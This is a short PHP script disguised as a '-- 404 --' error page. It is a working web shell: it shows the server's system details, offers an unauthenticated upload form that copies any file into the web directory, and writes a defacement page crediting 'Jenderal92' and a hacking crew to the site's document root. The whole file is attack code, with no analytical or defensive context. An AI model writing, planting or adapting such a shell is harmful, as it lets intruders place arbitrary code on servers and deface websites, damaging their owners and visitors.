<?php
echo "-- 404 --";
echo "<br>".php_uname()."<br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='zb'><input type='submit' name='upload' value='upload'>
</form>";
if($_POST['upload']) {
  if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) {
  echo "Upload Success";
  } else {
  echo "Failed to Upload.";
  }
}
   
$index_deface = '<title>Hacked by Jenderal92 </title><center><div id=q>Infected by Jenderal92 <br><font size=2>Icq : https://icq.im/Shin403
<br> Baku Hantam Crew - Naskleng45 - Moslem - h0d3_g4n - Kid Denta - ./sT0ry_mB3m - Mr.ARI4ANDA - 5YN15T3R_742</br>
<style>body{overflow:hidden;background-color:black}#q{font:40px impact;color:white;position:absolute;left:0;right:0;top:43%}</style>';
 
file_put_contents($_SERVER['DOCUMENT_ROOT'].'/shin.htm',$index_deface);
 
?>